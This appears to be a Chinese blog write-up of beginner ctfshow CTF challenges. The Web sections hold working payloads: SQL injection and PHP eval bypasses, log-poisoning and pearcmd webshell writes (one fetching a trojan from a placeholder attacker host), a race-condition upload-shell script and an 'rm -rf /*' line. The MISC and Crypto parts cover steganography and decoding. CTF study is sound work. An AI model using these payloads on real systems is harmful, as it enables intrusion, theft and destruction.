@@ -1,0 +1,336 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ctfshow_萌新 | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="除了部分Web都挺萌新的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow_萌新">
+<meta property="og:url" content="https://4reexile.github.io/article/ctfshow-mengxin/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="除了部分Web都挺萌新的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-06-21T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-07-05T11:04:16.590Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="绕过">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="隐写">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/ctfshow-mengxin/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ctfshow_萌新',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-05 19:04:16'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctfshow_萌新</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-06-21T16:00:00.000Z" title="Created 2024-06-22 00:00:00">2024-06-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-05T11:04:16.590Z" title="Updated 2024-07-05 19:04:16">2024-07-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctfshow%E9%9D%B6%E5%9C%BA/">ctfshow靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.7k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>部分题目由于自己也没有搞懂于是直接开抄, 请见谅</p>
+</blockquote>
+<h1>Web</h1>
+<hr>
+<h2 id="Web1"><a class="header-anchor" href="#Web1">¶</a>Web1</h2>
+<p>核心代码如下, 绕过正则即可, 或者sql注入</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"> <span class="comment"># 判断id的值是否大于999</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) &gt; <span class="number">999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="subst">$id</span> order by id limit 1 &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;执行的sql为：<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);	<span class="comment"># 执行sql 语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>能绕过的手段包括:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=~~1000		# 逻辑非</span><br><span class="line">?id=0000|1000	# 逻辑或</span><br><span class="line">?id=&#x27;1000&#x27;		# 字符串 </span><br><span class="line">?id=2 or id=1000	# 拼接语句(管道符)</span><br><span class="line">?id=!!1000		# 感叹号</span><br><span class="line">?id=0b001111101000	# 二进制转换</span><br><span class="line">?id=round(999.9)	# PHP四舍五入</span><br><span class="line">?id=8*125		# 数学运算</span><br><span class="line">?id=power(10,3)	# power函数</span><br><span class="line">?id=500 div 0.5	# sql的除号</span><br><span class="line">?id=&#x27;1e3&#x27;		# 科学记数法</span><br><span class="line">?id=/**/1000	# 注释</span><br><span class="line">?id=/*!1000*/	# 内联注释</span><br><span class="line">?id=125&lt;&lt;3		# 左右移</span><br><span class="line">?id=0x3E8		# intval()函数利用</span><br><span class="line">?id=2 union select * from article where id=1000	# 直接sql注入</span><br><span class="line">?id=CAST(0x339 AS INT)	# sql认为的1000, PHP不一定认.可以使用sql的十六进制的1000</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>intval()函数的第二个参数默认为10, 即只要遇到非数字转换就会暂停</p>
+</blockquote>
+<h2 id="web10"><a class="header-anchor" href="#web10">¶</a>web10</h2>
+<p>核心代码如下, 是eval类型的命令执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本题eval命令执行, 绕过方式:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;cat config.php&#x27;);	# 替换命令</span><br><span class="line">?c=echo `tac config.php`;		# 反引号命令执行</span><br><span class="line">?c=show_source(&#x27;config.php&#x27;);	# php函数命令执行</span><br><span class="line">?c=echo file_get_contents(&#x27;config.php&#x27;);	# 同上</span><br><span class="line">?c=readfile(&quot;config.php&quot;);		# 同上</span><br><span class="line">?c=$a=&#x27;sys&#x27;;$b=&#x27;tem&#x27;;$d=$a.$b;$d(&#x27;cat config.php&#x27;);	# 拼接</span><br><span class="line">?c=echo `$_GET[1]`;&amp;1=tac config.php	# GET方法</span><br><span class="line">?c=echo `$_POST[1]`;然后在post data中写入1=tac config.php	# POST方法</span><br><span class="line">?c=print_r(get_defined_vars()); # 在数组中取出当前已定义的变量</span><br><span class="line">?c=include(&#x27;php://filter/read=convert.base64-encode/resource=config.php&#x27;);</span><br><span class="line"># 变成命令执行再利用伪协议</span><br><span class="line">?c=$a=base64_decode(&#x27;c3lzdGVt&#x27;);$b=base64_decode(&#x27;Y2F0IGNvbmZpZy5waHA=&#x27;);$a($b);	# 编码绕过</span><br><span class="line">?c=echo `tac conf*`;	# 通配符</span><br><span class="line">?c=passthru(&#x27;tac conf?g?p?p&#x27;);	# 同上</span><br><span class="line">?c=echo tac confi[g][!0-9]ph[p];	# 同上</span><br><span class="line">?c=echo `tac conf\ig*`;	# 利用\隔开</span><br><span class="line">?c=echo $flag?&gt;		# 解了那么多次发现输出是$flag,那就试试直接输出它</span><br></pre></td></tr></table></figure>
+<p><code>print_r(getenv());</code>可以输出当前的环境变量, 可能会有用, 反正这题没用</p>
+<p>再给出一些可供替换的函数/命令/符号:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令执行: system(),exec(),passthru(),shell_exec(),proc_open()和popen()</span><br><span class="line">查看文件: cat,tac,more,head,tail,</span><br><span class="line">分号过滤: ?&gt;闭合开头后,最后一行可以不用分号</span><br><span class="line"></span><br><span class="line"># 对于popen()</span><br><span class="line">&lt;?php</span><br><span class="line">$handle = popen(&#x27;/bin/ls&#x27;, &#x27;r&#x27;);</span><br><span class="line">echo &quot;&#x27;$handle&#x27;; &quot; . gettype($handle) . &quot;\n&quot;;</span><br><span class="line">pclose($handle);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="Web17"><a class="header-anchor" href="#Web17">¶</a>Web17</h2>
+<p>核心代码如下, 是文件包含</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以nginx日志包含:</p>
+<ol>
+<li>访问/var/log/nginx/access.log</li>
+<li>在user-agent写入一句话木马<code>&lt;?php @eval($_POST['2333']); ?&gt;</code></li>
+<li>蚁剑连接即可</li>
+</ol>
+<h2 id="Web22"><a class="header-anchor" href="#Web22">¶</a>Web22</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\:|\/|\\\/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先介绍pear
+pear是一个是可重用的PHP组件框架和系统分发
+在pear中有一个pearcmd.php的类, 可以用+拼接命令, 例如从攻击机下载木马
+<code>pearcmd&amp;+download+http://xxxxx/index.php</code></p>
+<p>还有直接写shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;c=pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/var/www/html/test.php  </span><br><span class="line"># 在/var/www/html下写入webshell</span><br></pre></td></tr></table></figure>
+<p>然后可以POST <code>cmd=system(&quot;tac 36d.php&quot;);</code></p>
+<h2 id="获得百分百的快乐"><a class="header-anchor" href="#获得百分百的快乐">¶</a>获得百分百的快乐</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;hack!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>完全是通配符的利用,毕竟传入要求小于4, 完整使用方法可以看<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/87203">博客</a></p>
+<p>根据这个文章,我们只需要执行下面两个命令就能解决这个题目, 在F12就能拿到结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;nl		# 创建叫做nl的文件</span><br><span class="line">&gt;*		# 以第一个文件名为命令去执行</span><br></pre></td></tr></table></figure>
+<h2 id="Web23"><a class="header-anchor" href="#Web23">¶</a>Web23</h2>
+<p>乍看是文件上传,但是上传后却访问不到任何东西, 非常的神奇
+然后发现上传得到的文件是按照当前时间重新命名的,这可不行
+既然是重命名,那么就可以使用条件竞争策略进行爆破</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># Auth: y2hlbmc</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://7dbded2a-12d4-4d3a-a8c5-ddc6d8e78d74.challenge.ctf.show/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Thread</span>(<span class="params">fun,*args</span>):</span><br><span class="line">    <span class="keyword">return</span> threading.Thread(target=fun, args=args)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">fname</span>):</span><br><span class="line">    r = requests.get(url + <span class="string">&quot;uploads/&quot;</span> + fname + <span class="string">&quot;.php&quot;</span>)</span><br><span class="line">    x = r.text</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="string">&quot;404 Not Found&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> x <span class="keyword">and</span> <span class="string">&quot;容器已过期&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Thread_start</span>(<span class="params">fname</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">400</span>):</span><br><span class="line">        <span class="comment"># 每个文件名单起一个线程</span></span><br><span class="line">        Thread(req, fname + <span class="built_in">str</span>(i)).start()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_data = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&quot;&lt;?php system(\&quot;tac ../flaghere0.txt\&quot;);?&gt;&quot;</span>.encode())&#125;</span><br><span class="line">        r = requests.post(url + <span class="string">&quot;upload.php&quot;</span>,files=file_data)</span><br><span class="line">        txt = r.text</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;uploaded:&quot;</span>,txt)</span><br><span class="line">        <span class="comment"># 用本次的文件名推算下一次的文件名，相差sleep一次的时间间隔</span></span><br><span class="line">        ts = <span class="built_in">int</span>(time.mktime(time.strptime(txt[<span class="number">8</span>:<span class="number">22</span>], <span class="string">&quot;%Y%m%d%H%M%S&quot;</span>)))</span><br><span class="line">        fname = time.strftime(<span class="string">&quot;%Y%m%d%H%M%S&quot;</span>, time.localtime(ts + <span class="number">1</span>))</span><br><span class="line">        <span class="comment"># 单起一个线程，爆破下一次upload的文件名</span></span><br><span class="line">        Thread(Thread_start, fname).start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    upload()</span><br></pre></td></tr></table></figure>
+<p>嫖来的源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$new_filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>,<span class="title function_ invoke__">time</span>()).<span class="title function_ invoke__">rand</span>(<span class="number">100</span>,<span class="number">1000</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext_suffix</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_name</span>, <span class="string">&#x27;uploads/&#x27;</span>.<span class="variable">$new_filename</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;uploads/<span class="subst">$new_filename</span>&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf ./uploads/*.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>嫖来的<a target="_blank" rel="noopener" href="https://wp.ctf.show/d/131-23-24">出处</a></p>
+<h1>MISC</h1>
+<hr>
+<h2 id="杂项6"><a class="header-anchor" href="#杂项6">¶</a>杂项6</h2>
+<p>是伪加密, 没有密码</p>
+<p><strong>原理:</strong> 压缩包开头有一些固定的格式:</p>
+<ol>
+<li>压缩源文件数据区：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">50 4B 03 04		# 这是头文件标记  （0x04034b50）</span><br><span class="line">14 00		# 解压文件所需 pkware 版本</span><br><span class="line">00 00		# 全局方式位标记（判断有无加密）</span><br><span class="line">08 00		# 压缩方式</span><br><span class="line">DC 01		# 最后修改文件时间</span><br><span class="line">53 50		# 最后修改文件日期</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>压缩源文件目录区：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">50 4B 01 02		# 目录中文件文件头标记  （0x02014b50）</span><br><span class="line">1F 00		# 压缩使用的 pkware 版本</span><br><span class="line">14 00		# 解压文件所需 pkware 版本</span><br><span class="line">00 00		# 全局方式位标记（判断是否为伪加密）</span><br><span class="line">08 00		# 压缩方式</span><br><span class="line">DC 01		# 最后修改文件时间</span><br><span class="line">53 50		# 最后修改文件日期</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>压缩源文件目录结束标志：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">50 4B 05 06		# 目录结束标记</span><br><span class="line">00 00		# 当前磁盘编号</span><br><span class="line">00 00		# 目录区开始磁盘编号</span><br><span class="line">01 00		# 本磁盘上纪录总数</span><br><span class="line">01 00		# 目录区中纪录总数</span><br><span class="line">5A 00 00 00		# 目录区尺寸大小</span><br><span class="line">3B 00 00 00		# 目录区对第一张磁盘的偏移量</span><br><span class="line">00 00		# ZIP 文件注释长度</span><br></pre></td></tr></table></figure>
+<p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性
+第二个数字为奇数时 –&gt; 加密
+第二个数字为偶数时 –&gt; 未加密
+一般无加密的时候数字应该都是<code>00 00</code>, 而有加密的应该都是<code>09 00</code>, 伪加密则是只有第二个是<code>09 00</code></p>
+<p>本题文件16进制如下, 已经划分好标志了, 可以看出是伪加密, 将其修改为<code>00 00</code>即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240622104904527.png" alt="image-20240622104904527"></p>
+<h2 id="杂项7-8"><a class="header-anchor" href="#杂项7-8">¶</a>杂项7,8</h2>
+<p>类似, 就放在一起了</p>
+<p>根据题目的提示, 是修改宽和高, 十六进制中宽高位置如下:
+修改的时候我们一般是最高位加一或者减一, 可以直接拿到答案</p>
+<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240622110948116.png" alt="image-20240622110948116"></p>
+<p>对于一些工具, 通用方法是CRC校验和来爆破宽和高</p>
+<h2 id="杂项11"><a class="header-anchor" href="#杂项11">¶</a>杂项11</h2>
+<p>jpeg图片信息隐藏:
+利用jphs提取(seek)出txt文件, winhex发现似乎是png文件头, 修改后得到二维码
+扫码得到url, url后面是一串base64编码,解码得到flag
+<code>flag&#123;战神归来发现自己儿子在刷题，一怒之下召唤10万将士来报仇&#125;</code></p>
+<h2 id="萌新-隐写6"><a class="header-anchor" href="#萌新-隐写6">¶</a>萌新 隐写6</h2>
+<p>audacity打开文件后在音轨上找到类似摩斯电码的音频
+长的为<code>-</code>, 比较短的为<code>.</code>, 间隔比较长的是分隔符<code>/</code>,然后解码即可
+–/…-/–…/…/-.-/…/…/–./-----/-----/-…
+得到: MUZIKISG00D</p>
+<h1>Crypto</h1>
+<h2 id="萌新-密码1"><a class="header-anchor" href="#萌新-密码1">¶</a>萌新_密码1</h2>
+<p>web偶尔用一下, 浅学一点</p>
+<p>看到存在6C、6B、而且由予没有出现G及其以后的推测为16进制加密，尝试使用HEX16解密，得到
+S1lkZjBhM2ViZDVjNGRjMTYwLUV7ZmI2M2VlMDI5OGI4ZjRkOH0=
+看到了文末的=下意识认为是base64加密，尝试使用base64进行解密，得到结果为：
+KYdf0a3ebd5c4dc160-E{fb63ee0298b8f4d8}
+存在KEY{} 字符, 符合栅栏加密的方式, 于是尝试解密, 得到结果为： KEY{dffb06a33eeeb0d259c84bd8cf146d08-}</p>
+<h1>价值不多</h1>
+<h2 id="Web"><a class="header-anchor" href="#Web">¶</a>Web</h2>
+<hr>
+<h3 id="Web2-7"><a class="header-anchor" href="#Web2-7">¶</a>Web2-7</h3>
+<p>都是和Web1一样的过滤:
+Web2新增<code>or</code>
+Web3新增<code>- \\ * &lt; &gt; ! x hex +</code>
+Web4新增<code>\ / &lt; &gt; ! ( ) select</code>
+Web5新增<code>' &quot; |</code>
+Web6新增<code>^</code>
+Web7新增<code>~</code></p>
+<h3 id="Web8"><a class="header-anchor" href="#Web8">¶</a>Web8</h3>
+<p>告诉你了是程序猿跑了, 那就是删库跑路
+<code>?flag=rm -rf /*</code></p>
+<h3 id="Web9"><a class="header-anchor" href="#Web9">¶</a>Web9</h3>
+<p>压根没过滤, 甚至是指定命令执行,原因是正则表达式前面忘记加上<code>!</code>
+<code>?c=system('cat config.php');</code></p>
+<h3 id="Web11-15"><a class="header-anchor" href="#Web11-15">¶</a>Web11-15</h3>
+<p>过滤新增:
+Web11新增 <code>cat</code>
+Web12新增 <code>config . php config</code>
+Web13新增 <code>; file</code>
+Web14新增 <code>(</code>
+Web15新增 <code>* ? &lt; &gt; = </code>, 去除<code>;</code></p>
+<h3 id="Web16"><a class="header-anchor" href="#Web16">¶</a>Web16</h3>
+<p>爆破或者使用md5在线解密即可得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">payload=&#x27;&#x27;</span><br><span class="line">for i in str1:</span><br><span class="line">    for j in str1:</span><br><span class="line">        for k in str1:</span><br><span class="line">            s = hashlib.md5((&#x27;ctfshow&#x27;+i+j+k).encode()).hexdigest()</span><br><span class="line">            #print(type(s))</span><br><span class="line">            if s==&#x27;a6f57ae38a22448c2f07f3f95f49c84e&#x27;:</span><br><span class="line">                print(i+j+k)</span><br></pre></td></tr></table></figure>
